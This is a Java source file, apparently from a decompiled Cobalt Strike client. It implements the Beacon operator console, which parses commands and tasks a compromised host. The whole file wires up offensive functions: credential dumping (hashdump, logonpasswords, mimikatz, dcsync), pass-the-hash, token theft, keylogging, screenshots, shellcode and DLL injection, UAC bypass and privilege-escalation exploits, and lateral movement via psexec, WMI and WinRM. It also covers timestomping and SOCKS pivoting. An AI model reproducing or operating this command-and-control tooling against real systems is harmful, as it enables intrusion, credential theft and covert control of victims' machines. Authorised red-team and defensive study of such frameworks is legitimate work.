package aggressor.windows;

import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.WindowCleanup;
import aggressor.dialogs.ListenerChooser;
import beacon.*;
import common.*;
import console.*;
import cortana.Cortana;
import dialog.SafeDialogs;
import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.util.LinkedList;
import java.util.Stack;

public class BeaconConsole
        extends AObject implements ActionListener,
        ConsolePopup,
        Callback {
    protected Console console;
    protected TeamQueue conn;
    protected Cortana engine;
    protected DataManager data;
    protected WindowCleanup state = null;
    protected String bid;
    protected TaskBeacon master;
    protected AggressorClient client;

    public BeaconConsole(String bid, AggressorClient client) {
        this(bid, client, client.getData(), client.getScriptEngine(), client.getConnection());
    }

    public String getPrompt() {
        return Colors.underline("beacon") + "> ";
    }

    public String Script(String name) {
        return "BEACON_" + name;
    }

    public BeaconConsole(String bid, AggressorClient client, DataManager data, Cortana engine, TeamQueue conn) {
        this.engine = engine;
        this.conn = conn;
        this.data = data;
        this.bid = bid;
        this.client = client;
        this.master = new TaskBeacon(client, data, conn, new String[]{bid});
        this.console = new ActivityConsole(true);
        this.console.updatePrompt(this.getPrompt());
        this.console.getInput().addActionListener(this);
        StringBuilder previous = new StringBuilder();
        for (Object o : DataUtils.getBeaconTranscriptAndSubscribe(data, bid, this)) {
            String candidate = this.format((BeaconOutput) o);
            if (candidate == null) continue;
            previous.append(candidate).append("\n");
        }
        this.console.append(previous.toString());
        data.subscribe("beacons", this);
        BeaconEntry temp = DataUtils.getBeacon(data, bid);
        if (temp != null) {
            String left = engine.format(this.Script("SBAR_LEFT"), temp.eventArguments());
            String right = engine.format(this.Script("SBAR_RIGHT"), temp.eventArguments());
            this.console.getStatusBar().set(left, right);
        }
        this.getTabCompletion();
        this.console.setPopupMenu(this);
    }

    public GenericTabCompletion getTabCompletion() {
        return new BeaconTabCompletion(this.bid, this.client, this.console);
    }

    public ActionListener cleanup() {
        return this.data.unsubOnClose("beacons, beaconlog", this);
    }

    public Console getConsole() {
        return this.console;
    }

    @Override
    public void result(String key, Object o) {
        BeaconOutput next;
        String candidate;
        if (key.equals("beacons") && this.console.isShowing()) {
            BeaconEntry temp = DataUtils.getBeaconFromResult(o, this.bid);
            if (temp == null) {
                return;
            }
            String left = this.engine.format(this.Script("SBAR_LEFT"), temp.eventArguments());
            String right = this.engine.format(this.Script("SBAR_RIGHT"), temp.eventArguments());
            this.console.getStatusBar().left(left);
            this.console.getStatusBar().right(right);
        } else if (key.equals("beaconlog") && (next = (BeaconOutput) o).is(this.bid) && (candidate = this.format(next)) != null) {
            this.console.append(candidate + "\n");
        }
    }

    public String format(BeaconOutput o) {
        return this.engine.format(o.eventName().toUpperCase(), o.eventArguments());
    }

    @Override
    public void showPopup(String word, MouseEvent ev) {
        Stack<Scalar> arg = new Stack<>();
        LinkedList<String> items = new LinkedList<>();
        items.add(this.bid);
        arg.push(SleepUtils.getArrayWrapper(items));
        this.engine.getMenuBuilder().installMenu(ev, "beacon", arg);
    }

    public String formatLocal(BeaconOutput message) {
        message.from = DataUtils.getNick(this.data);
        return this.format(message);
    }

    @Override
    public void actionPerformed(ActionEvent ev) {
        String text = ev.getActionCommand().trim();
        ((JTextField) ev.getSource()).setText("");
        CommandParser parser = new CommandParser(text);
        if (this.client.getAliases().isAlias(parser.getCommand())) {
            this.master.input(text);
            this.client.getAliases().fireCommand(this.bid, parser.getCommand(), parser.getArguments());
            return;
        }
        if (parser.is("help") || parser.is("?")) {
            this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, text)) + "\n");
            if (parser.verify("Z") || parser.reset()) {
                String command = parser.popString();
                BeaconCommands details = DataUtils.getBeaconCommands(this.data);
                if (details.isHelpAvailable(command)) {
                    Stack<Scalar> temp = new Stack<>();
                    temp.push(SleepUtils.getScalar(command));
                    this.console.append(this.engine.format("BEACON_OUTPUT_HELP_COMMAND", temp) + "\n");
                } else {
                    parser.error("no help is available for '" + command + "'");
                }
            } else {
                this.console.append(this.engine.format("BEACON_OUTPUT_HELP", new Stack()) + "\n");
            }
            if (parser.hasError()) {
                this.console.append(this.formatLocal(BeaconOutput.Error(this.bid, parser.error())) + "\n");
            }
            return;
        }
        if (parser.is("downloads")) {
            this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, text)) + "\n");
            this.conn.call("beacons.downloads", CommonUtils.args(this.bid), (key, o) -> {
                Stack<Scalar> args = new Stack<>();
                args.push(CommonUtils.convertAll(o));
                args.push(SleepUtils.getScalar(BeaconConsole.this.bid));
                BeaconConsole.this.console.append(BeaconConsole.this.engine.format("BEACON_OUTPUT_DOWNLOADS", args) + "\n");
            });
            return;
        }
        if (parser.is("elevate") && parser.empty()) {
            BeaconExploits exploits = DataUtils.getBeaconExploits(this.data);
            this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, text)) + "\n");
            this.console.append(this.engine.format("BEACON_OUTPUT_EXPLOITS", new Stack()) + "\n");
            return;
        }
        this.master.input(text);
        if (parser.is("browserpivot")) {
            if (parser.verify("IX") || parser.reset()) {
                String arch = parser.popString();
                int pid = parser.popInt();
                this.master.BrowserPivot(pid, arch);
            } else if (parser.verify("I") || parser.reset()) {
                this.master.BrowserPivot(parser.popInt(), "x86");
            } else if (parser.verify("?") && !parser.popBoolean()) {
                this.master.BrowserPivotStop();
            }
        } else if (parser.is("bypassuac")) {
            if (parser.verify("L")) {
                this.master.BypassUAC(parser.popString());
            } else if (parser.isMissingArguments()) {
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> BeaconConsole.this.master.BypassUAC(r));
                chooser.show();
            }
        } else if (parser.is("cancel")) {
            if (parser.verify("Z")) {
                this.master.Cancel(parser.popString());
            }
        } else if (parser.is("cd")) {
            if (parser.verify("Z")) {
                this.master.Cd(parser.popString());
            }
        } else if (parser.is("checkin")) {
            this.master.Checkin();
        } else if (parser.is("clear")) {
            this.master.Clear();
        } else if (parser.is("covertvpn")) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, this.bid);
            if (parser.verify("AA")) {
                String inti = parser.popString();
                String intf = parser.popString();
                this.master.CovertVPN(intf, inti);
            } else if (parser.isMissingArguments() && parser.verify("A")) {
                String intf = parser.popString();
                this.master.CovertVPN(intf, entry.getInternal());
            }
        } else if (parser.is("cp")) {
            if (parser.verify("AZ")) {
                String dst = parser.popString();
                String src = parser.popString();
                this.master.Copy(src, dst);
            }
        } else if (parser.is("dcsync")) {
            if (parser.verify("AA")) {
                String user = parser.popString();
                String fqdn = parser.popString();
                this.master.DcSync(fqdn, user);
            }
        } else if (parser.is("desktop")) {
            if (parser.verify("IXQ") || parser.reset()) {
                String quality = parser.popString();
                String arch = parser.popString();
                int pid = parser.popInt();
                this.master.Desktop(pid, arch, quality.equals("high"));
            } else if (parser.verify("IX") || parser.reset()) {
                String arch = parser.popString();
                int pid = parser.popInt();
                this.master.Desktop(pid, arch, true);
            } else if (parser.verify("IQ") || parser.reset()) {
                String quality = parser.popString();
                int pid = parser.popInt();
                this.master.Desktop(pid, "x86", quality.equals("high"));
            } else if (parser.verify("I") || parser.reset()) {
                int pid = parser.popInt();
                this.master.Desktop(pid, "x86", true);
            } else if (parser.verify("Q")) {
                String quality = parser.popString();
                this.master.Desktop(quality.equals("high"));
            } else if (parser.isMissingArguments()) {
                this.master.Desktop(true);
            }
        } else if (parser.is("dllinject")) {
            if (parser.verify("IF")) {
                String file = parser.popString();
                int pid = parser.popInt();
                this.master.DllInject(pid, file);
            } else if (parser.isMissingArguments() && parser.verify("I")) {
                final int pid = parser.popInt();
                SafeDialogs.openFile("Select Reflective DLL", null, null, false, false, r -> BeaconConsole.this.master.DllInject(pid, r));
            }
        } else if (parser.is("dllload")) {
            if (parser.verify("IZ")) {
                String file = parser.popString();
                int pid = parser.popInt();
                this.master.DllLoad(pid, file);
            }
        } else if (parser.is("download")) {
            if (parser.verify("Z")) {
                this.master.Download(parser.popString());
            }
        } else if (parser.is("drives")) {
            this.master.Drives();
        } else if (parser.is("elevate")) {
            BeaconExploits exploits = DataUtils.getBeaconExploits(this.data);
            if (parser.verify("AL")) {
                String listener = parser.popString();
                String exploit = parser.popString();
                if (exploits.isExploit(exploit)) {
                    this.master.Elevate(exploit, listener);
                } else {
                    parser.error("no such exploit '" + exploit + "'");
                }
            } else if (parser.isMissingArguments() && parser.verify("A")) {
                final String exploit = parser.popString();
                if (exploits.isExploit(exploit)) {
                    ListenerChooser chooser = new ListenerChooser(this.conn, this.data, listener -> BeaconConsole.this.master.Elevate(exploit, listener));
                    chooser.show();
                } else {
                    parser.error("no such exploit '" + exploit + "'");
                }
            }
        } else if (parser.is("execute")) {
            if (parser.verify("Z")) {
                this.master.Execute(parser.popString());
            }
        } else if (parser.is("execute-assembly")) {
            if (parser.verify("pZ")) {
                String args = parser.popString();
                String file = parser.popString();
                this.master.ExecuteAssembly(file, args);
            } else if (parser.isMissingArguments() && parser.verify("F")) {
                String file = parser.popString();
                this.master.ExecuteAssembly(file, "");
            }
        } else if (parser.is("exit")) {
            this.master.Die();
        } else if (parser.is("getprivs")) {
            this.master.GetPrivs();
        } else if (parser.is("getsystem")) {
            this.master.GetSystem();
        } else if (parser.is("getuid")) {
            this.master.GetUID();
        } else if (parser.is("hashdump")) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, this.bid);
            if (!entry.isAdmin()) {
                parser.error("this command requires administrator privileges");
            } else {
                this.master.Hashdump();
            }
        } else if (parser.is("inject")) {
            if (parser.verify("IXL") || parser.reset()) {
                String listener = parser.popString();
                String arch = parser.popString();
                int pid = parser.popInt();
                this.master.Inject(pid, listener, arch);
            } else if (parser.verify("IX") || parser.reset()) {
                final String arch = parser.popString();
                final int pid = parser.popInt();
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> BeaconConsole.this.master.Inject(pid, r, arch));
                chooser.show();
            } else if (parser.verify("IL")) {
                String listener = parser.popString();
                int pid = parser.popInt();
                this.master.Inject(pid, listener, "x86");
            } else if (parser.isMissingArguments() && parser.verify("I")) {
                final int pid = parser.popInt();
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> BeaconConsole.this.master.Inject(pid, r, "x86"));
                chooser.show();
            }
        } else if (parser.is("jobkill")) {
            if (parser.verify("I")) {
                int jobid = parser.popInt();
                this.master.JobKill(jobid);
            }
        } else if (parser.is("jobs")) {
            this.master.Jobs();
        } else if (parser.is("kerberos_ticket_purge")) {
            this.master.KerberosTicketPurge();
        } else if (parser.is("kerberos_ccache_use") && parser.empty()) {
            SafeDialogs.openFile("Select ticket to use", null, null, false, false, r -> BeaconConsole.this.master.KerberosCCacheUse(r));
        } else if (parser.is("kerberos_ccache_use")) {
            if (parser.verify("F")) {
                this.master.KerberosCCacheUse(parser.popString());
            }
        } else if (parser.is("kerberos_ticket_use") && parser.empty()) {
            SafeDialogs.openFile("Select ticket to use", null, null, false, false, r -> BeaconConsole.this.master.KerberosTicketUse(r));
        } else if (parser.is("kerberos_ticket_use")) {
            if (parser.verify("F")) {
                this.master.KerberosTicketUse(parser.popString());
            }
        } else if (parser.is("keylogger")) {
            if (parser.empty()) {
                this.master.KeyLogger();
            } else if (parser.verify("IX") || parser.reset()) {
                String arch = parser.popString();
                int pid = parser.popInt();
                this.master.KeyLogger(pid, arch);
            } else if (parser.verify("I")) {
                this.master.KeyLogger(parser.popInt(), "x86");
            }
        } else if (parser.is("kill")) {
            if (parser.verify("I")) {
                this.master.Kill(parser.popInt());
            }
        } else if (parser.is("link")) {
            if (parser.verify("Z")) {
                this.master.Link(parser.popString());
            }
        } else if (parser.is("logonpasswords")) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, this.bid);
            if (!entry.isAdmin()) {
                parser.error("this command requires administrator privileges");
            } else {
                this.master.LogonPasswords();
            }
        } else if (parser.is("ls")) {
            if (parser.verify("Z") || parser.reset()) {
                this.master.Ls(parser.popString());
            } else {
                this.master.Ls(".");
            }
        } else if (parser.is("make_token")) {
            if (parser.verify("AZ")) {
                String pass = parser.popString();
                String user = parser.popString();
                if (!user.contains("\\")) {
                    this.master.LoginUser(".", user, pass);
                } else {
                    StringStack split2 = new StringStack(user, "\\");
                    String domain = split2.shift();
                    String userz = split2.shift();
                    this.master.LoginUser(domain, userz, pass);
                }
            }
        } else if (parser.is("message")) {
            if (parser.verify("Z")) {
                this.master.Message(parser.popString());
            }
        } else if (parser.is("mimikatz")) {
            if (parser.verify("Z")) {
                this.master.Mimikatz(parser.popString());
            }
        } else if (parser.is("mkdir")) {
            if (parser.verify("Z")) {
                this.master.MkDir(parser.popString());
            }
        } else if (parser.is("mode")) {
            if (parser.verify("C")) {
                String channel = parser.popString();
                switch (channel) {
                    case "dns":
                        this.master.ModeDNS();
                        break;
                    case "dns6":
                        this.master.ModeDNS6();
                        break;
                    case "dns-txt":
                        this.master.ModeDNS_TXT();
                        break;
                    case "http":
                        this.master.ModeHTTP();
                        break;
                    case "smb":
                        this.master.ModeSMB();
                        break;
                }
            }
        } else if (parser.is("mv")) {
            if (parser.verify("AZ")) {
                String dst = parser.popString();
                String src = parser.popString();
                this.master.Move(src, dst);
            }
        } else if (parser.is("net")) {
            if (parser.verify("VZ")) {
                parser.popString();
                String verb = parser.popString();
                parser.reset();
                if (CommonUtils.contains("computers, dclist, domain_trusts, view", verb)) {
                    parser.verify("VZ");
                    String domain = parser.popString();
                    String command = parser.popString();
                    this.master.NetView(command, domain, null);
                } else if (CommonUtils.contains("group, localgroup, user", verb)) {
                    if (parser.verify("VAZ")) {
                        parser.reset();
                        if (parser.verify("VUZ")) {
                            String param = parser.popString();
                            String target = parser.popString();
                            String command = parser.popString();
                            this.master.NetView(command, target, param);
                        }
                    } else if (parser.isMissingArguments() && parser.verify("VZ")) {
                        parser.reset();
                        if (parser.verify("VU") || parser.reset()) {
                            String target = parser.popString();
                            String command = parser.popString();
                            this.master.NetView(command, target, null);
                        } else if (parser.verify("VZ")) {
                            String param = parser.popString();
                            String command = parser.popString();
                            this.master.NetView(command, "localhost", param);
                        }
                    }
                } else if (CommonUtils.contains("share, sessions, logons, time", verb) && parser.verify("VU")) {
                    String target = parser.popString();
                    String command = parser.popString();
                    this.master.NetView(command, target, null);
                }
            } else if (parser.isMissingArguments() && parser.verify("V")) {
                String verb = parser.popString();
                if (CommonUtils.contains("computers, dclist, domain_trusts, view", verb)) {
                    this.master.NetView(verb, null, null);
                } else {
                    this.master.NetView(verb, "localhost", null);
                }
            }
        } else if (parser.is("note")) {
            if (parser.verify("Z")) {
                String note = parser.popString();
                this.master.Note(note);
            } else if (parser.isMissingArguments()) {
                this.master.Note("");
            }
        } else if (parser.is("portscan")) {
            if (parser.verify("TRDI")) {
                int maxconns = parser.popInt();
                String discover = parser.popString();
                String ports = parser.popString();
                String targets = parser.popString();
                this.master.PortScan(targets, ports, discover, maxconns);
            } else if (parser.isMissingArguments() && parser.verify("TRD")) {
                String discover = parser.popString();
                String ports = parser.popString();
                String targets = parser.popString();
                this.master.PortScan(targets, ports, discover, 1024);
            } else if (parser.isMissingArguments() && parser.verify("TR")) {
                String ports = parser.popString();
                String targets = parser.popString();
                this.master.PortScan(targets, ports, "icmp", 1024);
            } else if (parser.isMissingArguments() && parser.verify("T")) {
                String targets = parser.popString();
                this.master.PortScan(targets, "1-1024,3389,5900-6000", "icmp", 1024);
            }
        } else if (parser.is("powerpick")) {
            if (parser.verify("Z")) {
                this.master.PowerShellUnmanaged(parser.popString());
            }
        } else if (parser.is("powershell")) {
            if (parser.verify("Z")) {
                this.master.PowerShell(parser.popString());
            }
        } else if (parser.is("powershell-import") && parser.empty()) {
            SafeDialogs.openFile("Select script to import", null, null, false, false, r -> BeaconConsole.this.master.PowerShellImport(r));
        } else if (parser.is("powershell-import")) {
            if (parser.verify("f")) {
                this.master.PowerShellImport(parser.popString());
            }
        } else if (parser.is("ppid")) {
            if (parser.verify("I")) {
                this.master.PPID(parser.popInt());
            } else if (parser.isMissingArguments()) {
                this.master.PPID(0);
            }
        } else if (parser.is("ps")) {
            this.master.Ps();
        } else if (parser.is("psexec")) {
            if (parser.verify("AAL")) {
                String listener = parser.popString();
                String share = parser.popString();
                String host = parser.popString();
                this.master.PsExec(host, listener, share);
            } else if (parser.isMissingArguments() && parser.verify("AA")) {
                final String share = parser.popString();
                final String host = parser.popString();
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> BeaconConsole.this.master.PsExec(host, r, share));
                chooser.show();
            }
        } else if (parser.is("psexec_psh")) {
            if (parser.verify("AL")) {
                String listener = parser.popString();
                String host = parser.popString();
                this.master.PsExecPSH(host, listener);
            } else if (parser.isMissingArguments() && parser.verify("A")) {
                final String host = parser.popString();
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> BeaconConsole.this.master.PsExecPSH(host, r));
                chooser.show();
            }
        } else if (parser.is("psinject")) {
            if (parser.verify("IXZ")) {
                String command = parser.popString();
                String arch = parser.popString();
                int pid = parser.popInt();
                this.master.PsInject(pid, arch, command);
            }
        } else if (parser.is("pth")) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, this.bid);
            if (!entry.isAdmin()) {
                parser.error("this command requires administrator privileges");
            } else if (parser.verify("AH")) {
                String pass = parser.popString();
                String user = parser.popString();
                if (!user.contains("\\")) {
                    this.master.PassTheHash(".", user, pass);
                } else {
                    StringStack split3 = new StringStack(user, "\\");
                    String domain = split3.shift();
                    String userz = split3.shift();
                    this.master.PassTheHash(domain, userz, pass);
                }
            }
        } else if (parser.is("pwd")) {
            this.master.Pwd();
        } else if (parser.is("reg")) {
            if (parser.verify("gXZ")) {
                String verb;
                String path = parser.popString();
                String arch = parser.popString();
                Registry reg = new Registry(arch, path, "queryv".equals(verb = parser.popString()));
                if (!reg.isValid()) {
                    parser.error(reg.getError());
                } else if ("queryv".equals(verb)) {
                    this.master.RegQueryValue(reg);
                } else if ("query".equals(verb)) {
                    this.master.RegQuery(reg);
                }
            }
        } else if (parser.is("rev2self")) {
            this.master.Rev2Self();
        } else if (parser.is("rm")) {
            if (parser.verify("Z")) {
                this.master.Rm(parser.popString());
            }
        } else if (parser.is("rportfwd")) {
            if (parser.verify("IAI") || parser.reset()) {
                int fport = parser.popInt();
                String fhost = parser.popString();
                int bport = parser.popInt();
                this.master.PortForward(bport, fhost, fport);
            } else if (parser.verify("AI")) {
                int bport = parser.popInt();
                String verb = parser.popString();
                if (!"stop".equals(verb)) {
                    parser.error("only acceptable argument is stop");
                } else {
                    this.master.PortForwardStop(bport);
                }
            }
        } else if (parser.is("run")) {
            if (parser.verify("Z")) {
                this.master.Run(parser.popString());
            }
        } else if (parser.is("runas")) {
            if (parser.verify("AAZ")) {
                String cmd = parser.popString();
                String pass = parser.popString();
                String user = parser.popString();
                if (!user.contains("\\")) {
                    this.master.RunAs(".", user, pass, cmd);
                } else {
                    StringStack split4 = new StringStack(user, "\\");
                    String domain = split4.shift();
                    String userz = split4.shift();
                    this.master.RunAs(domain, userz, pass, cmd);
                }
            }
        } else if (parser.is("runasadmin")) {
            if (parser.verify("Z")) {
                String cmd = parser.popString();
                this.master.ExecuteHighIntegrity(cmd, "Tasked Beacon to execute: " + cmd + " in a high integrity context");
            }
        } else if (parser.is("runu")) {
            if (parser.verify("IZ")) {
                String cmd = parser.popString();
                int ppid = parser.popInt();
                this.master.RunUnder(ppid, cmd);
            }
        } else if (parser.is("screenshot")) {
            if (parser.verify("IXI") || parser.reset()) {
                int time = parser.popInt();
                String arch = parser.popString();
                int pid = parser.popInt();
                this.master.Screenshot(pid, arch, time);
            } else if (parser.verify("IX") || parser.reset()) {
                String arch = parser.popString();
                int pid = parser.popInt();
                this.master.Screenshot(pid, arch, 0);
            } else if (parser.verify("II") || parser.reset()) {
                int time = parser.popInt();
                int pid = parser.popInt();
                this.master.Screenshot(pid, "x86", time);
            } else if (parser.verify("I") || parser.reset()) {
                int pid = parser.popInt();
                this.master.Screenshot(pid, "x86", 0);
            } else {
                this.master.Screenshot(0);
            }
        } else if (parser.is("setenv")) {
            if (parser.verify("AZ")) {
                String val = parser.popString();
                String key = parser.popString();
                this.master.SetEnv(key, val);
            } else if (parser.isMissingArguments() && parser.verify("A")) {
                String key = parser.popString();
                this.master.SetEnv(key, null);
            }
        } else if (parser.is("shell")) {
            if (parser.verify("Z")) {
                this.master.Shell(parser.popString());
            }
        } else if (parser.is("sleep")) {
            if (parser.verify("I%") || parser.reset()) {
                int jitter = parser.popInt();
                int time = parser.popInt();
                this.master.Sleep(time, jitter);
            } else if (parser.verify("I")) {
                this.master.Sleep(parser.popInt(), 0);
            }
        } else if (parser.is("socks")) {
            if (parser.verify("I") || parser.reset()) {
                this.master.SocksStart(parser.popInt());
            } else if (parser.verify("Z")) {
                if (!parser.popString().equals("stop")) {
                    parser.error("only acceptable argument is stop or port");
                } else {
                    this.master.SocksStop();
                }
            }
        } else if (parser.is("spawn")) {
            if (parser.empty()) {
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> BeaconConsole.this.master.Spawn(r, "x86"));
                chooser.show();
            } else if (parser.verify("XL") || parser.reset()) {
                String listener = parser.popString();
                String arch = parser.popString();
                this.master.Spawn(listener, arch);
            } else if (parser.verify("X") || parser.reset()) {
                final String arch = parser.popString();
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> BeaconConsole.this.master.Spawn(r, arch));
                chooser.show();
            } else if (parser.verify("L")) {
                this.master.Spawn(parser.popString(), "x86");
            }
        } else if (parser.is("spawnas")) {
            if (parser.verify("AAL")) {
                String listener = parser.popString();
                String pass = parser.popString();
                String user = parser.popString();
                if (!user.contains("\\")) {
                    this.master.SpawnAs(".", user, pass, listener);
                } else {
                    StringStack split5 = new StringStack(user, "\\");
                    String domain = split5.shift();
                    String userz = split5.shift();
                    this.master.SpawnAs(domain, userz, pass, listener);
                }
            } else if (parser.isMissingArguments() && parser.verify("AA")) {
                final String pass = parser.popString();
                final String user = parser.popString();
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> {
                    if (!user.contains("\\")) {
                        BeaconConsole.this.master.SpawnAs(".", user, pass, r);
                    } else {
                        StringStack split2 = new StringStack(user, "\\");
                        String domain = split2.shift();
                        String userz = split2.shift();
                        BeaconConsole.this.master.SpawnAs(domain, userz, pass, r);
                    }
                });
                chooser.show();
            }
        } else if (parser.is("spawnto")) {
            if (parser.empty()) {
                this.master.SpawnTo();
            } else if (parser.verify("XZ")) {
                String path = parser.popString();
                String arch = parser.popString();
                this.master.SpawnTo(arch, path);
            }
        } else if (parser.is("spawnu")) {
            if (parser.verify("IL")) {
                String listener = parser.popString();
                int ppid = parser.popInt();
                this.master.SpawnUnder(ppid, listener);
            } else if (parser.isMissingArguments() && parser.verify("I")) {
                final int ppid = parser.popInt();
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> BeaconConsole.this.master.SpawnUnder(ppid, r));
                chooser.show();
            }
        } else if (parser.is("ssh")) {
            if (parser.verify("AAZ")) {
                String pass = parser.popString();
                String user = parser.popString();
                String arg = parser.popString();
                String host = CommonUtils.Host(arg);
                int port = CommonUtils.Port(arg, 22);
                this.master.SecureShell(user, pass, host, port);
            }
        } else if (parser.is("ssh-key")) {
            if (parser.verify("AAF")) {
                String file = parser.popString();
                String user = parser.popString();
                String arg = parser.popString();
                String host = CommonUtils.Host(arg);
                int port = CommonUtils.Port(arg, 22);
                byte[] kdata = CommonUtils.readFile(file);
                if (kdata.length > 6140) {
                    parser.error("key file " + file + " is too large");
                } else {
                    this.master.SecureShellPubKey(user, kdata, host, port);
                }
            } else if (parser.isMissingArguments() && parser.verify("AA")) {
                final String user = parser.popString();
                String arg = parser.popString();
                final String host = CommonUtils.Host(arg);
                final int port = CommonUtils.Port(arg, 22);
                SafeDialogs.openFile("Select PEM file", null, null, false, false, r -> {
                    byte[] kdata = CommonUtils.readFile(r);
                    BeaconConsole.this.master.SecureShellPubKey(user, kdata, host, port);
                });
            }
        } else if (parser.is("steal_token")) {
            if (parser.verify("I")) {
                this.master.StealToken(parser.popInt());
            }
        } else if (parser.is("shinject")) {
            if (parser.verify("IXF") || parser.reset()) {
                String file = parser.popString();
                String arch = parser.popString();
                int pid = parser.popInt();
                this.master.ShellcodeInject(pid, arch, file);
            } else if (parser.verify("IX")) {
                final String arch = parser.popString();
                final int pid = parser.popInt();
                SafeDialogs.openFile("Select shellcode to inject", null, null, false, false, r -> BeaconConsole.this.master.ShellcodeInject(pid, arch, r));
            }
        } else if (parser.is("shspawn")) {
            if (parser.verify("XF") || parser.reset()) {
                String file = parser.popString();
                String arch = parser.popString();
                this.master.ShellcodeSpawn(arch, file);
            } else if (parser.verify("X")) {
                final String arch = parser.popString();
                SafeDialogs.openFile("Select shellcode to inject", null, null, false, false, r -> BeaconConsole.this.master.ShellcodeSpawn(arch, r));
            }
        } else if (parser.is("timestomp")) {
            if (parser.verify("AA")) {
                String src = parser.popString();
                String dest = parser.popString();
                this.master.TimeStomp(dest, src);
            }
        } else if (parser.is("unlink")) {
            if (parser.verify("Z")) {
                this.master.Unlink(parser.popString());
            }
        } else if (parser.is("upload") && parser.empty()) {
            SafeDialogs.openFile("Select file to upload", null, null, false, false, r -> BeaconConsole.this.master.Upload(r));
        } else if (parser.is("upload")) {
            if (parser.verify("f")) {
                this.master.Upload(parser.popString());
            }
        } else if (parser.is("wdigest")) {
            BeaconEntry entry = DataUtils.getBeacon(this.data, this.bid);
            if (!entry.isAdmin()) {
                parser.error("this command requires administrator privileges");
            } else {
                this.master.WDigest();
            }
        } else if (parser.is("winrm")) {
            if (parser.verify("AL")) {
                String listener = parser.popString();
                String host = parser.popString();
                this.master.WinRM(host, listener);
            } else if (parser.isMissingArguments() && parser.verify("A")) {
                final String host = parser.popString();
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> BeaconConsole.this.master.WinRM(host, r));
                chooser.show();
            }
        } else if (parser.is("wmi")) {
            if (parser.verify("AL")) {
                String listener = parser.popString();
                String host = parser.popString();
                this.master.WMI(host, listener);
            } else if (parser.isMissingArguments() && parser.verify("A")) {
                final String host = parser.popString();
                ListenerChooser chooser = new ListenerChooser(this.conn, this.data, r -> BeaconConsole.this.master.WMI(host, r));
                chooser.show();
            }
        } else {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(this.bid, "Unknown command: " + text)));
        }
        if (parser.hasError()) {
            this.conn.call("beacons.log_write", CommonUtils.args(BeaconOutput.Error(this.bid, parser.error())));
        }
    }

}

